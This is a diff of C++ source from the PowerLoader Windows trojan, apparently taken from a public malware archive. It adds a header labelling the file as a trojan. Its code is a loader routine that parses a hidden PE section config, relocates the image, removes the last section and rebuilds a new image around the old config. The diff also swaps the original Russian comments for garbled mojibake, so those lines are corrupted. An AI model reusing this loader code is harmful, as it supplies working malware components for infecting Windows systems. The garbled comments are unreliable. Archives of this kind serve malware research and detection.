@@ -1,3 +1,14 @@
+/*
+  name      PowerLoader
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -51,10 +62,10 @@ BOOLEAN SecCfg::GetSectionConfig(PSECTION_CONFIG SectionConfig, PVOID Image)
 	{
 		ConfigHeader = MAKE_PTR(Image, SectionHeader->VirtualAddress, PSECTION_CONFIG_RAW);
 
-		// Копируем рав конфиг там размер имейджа и конфига
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		CopyMemory(&SectionConfig->Raw, ConfigHeader, sizeof(SECTION_CONFIG_RAW));
 
-		// Указатели на имейдж и конфиг
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		SectionConfig->Config = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW));
 		SectionConfig->Image = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW) + ConfigHeader->ConfigSize);
 
@@ -117,37 +128,37 @@ BOOLEAN SecCfg::ConvertImageToImage(PVOID ImageBase, SecCfg::PSECTION_CONFIG Sec
 		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) SizeOfImage = ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage;
 		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) SizeOfImage = ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage;
 
-		// Новый конфиг размер имейджа = старый имейдж минус размер последней секции
+		// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ = пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		NewSectionConfig.Raw.ImageSize = SizeOfImage - LastSection->Misc.VirtualSize;
 		NewSectionConfig.Image = malloc(NewSectionConfig.Raw.ImageSize);
 		if (NewSectionConfig.Image)
 		{
-			// Копируем все без последней секции
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			CopyMemory(NewSectionConfig.Image, ImageBase, NewSectionConfig.Raw.ImageSize);
-			// Релокаем старый к дефолтной базе (новая база из хидера - старая база (текущая))
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅ))
 			if (PeLdr::PeProcessRelocs(NewSectionConfig.Image, (DWORD64)PeLdr::PeGetImageBase(ImageBase) - (DWORD64)ImageBase))
 			{
 				NtHeaders = PeLdr::PeImageNtHeader(NewSectionConfig.Image);
 				LastSection = PeLdr::GetVirtualyLastSectionHeader(NtHeaders);
 
-				// Фиксим заголовок размер имейджа
+				// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage -= LastSection->Misc.VirtualSize;
 				if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage -= LastSection->Misc.VirtualSize;
 
-				// Обнуляем последнею секцию
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				ZeroMemory(LastSection, sizeof(IMAGE_SECTION_HEADER));
 
-				// -1 секцию (конфиг в старом имейдже)
+				// -1 пїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 				NtHeaders->FileHeader.NumberOfSections--;
 
-				// Конфиг нового имейджа мутим туда старый конфиг
+				// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				NewSectionConfig.Name = SECCFG_SECTION_NAME;
 				NewSectionConfig.Raw.ConfigSize = SectionConfig->Raw.ConfigSize;
 				NewSectionConfig.Config = SectionConfig->Config;
 
 				if (Load64)
 				{
-					// Если первый запуск нужно прогрузить секции 64 имейджа по вирутальным адресам
+					// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					NewImageBase = LoadImageSections(SectionConfig->Image, &NewImageSize);
 				}
 				else
@@ -158,7 +169,7 @@ BOOLEAN SecCfg::ConvertImageToImage(PVOID ImageBase, SecCfg::PSECTION_CONFIG Sec
 
 				if (NewImageBase)
 				{
-					// Вставляем наш новый конфиг со старым имейджем в новый имейдж со старого конфига (секция будет добавлена по вирутальному адресу)
+					// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)
 					if (InsertSectionConfig(&NewSectionConfig, NewImageBase, NewImageSize, ResultImage, ResultImageSize, TRUE))
 					{
 						Result = PeLdr::PeProcessRelocs(*ResultImage, (DWORD64)*ResultImage - PeLdr::PeGetImageBase(*ResultImage));
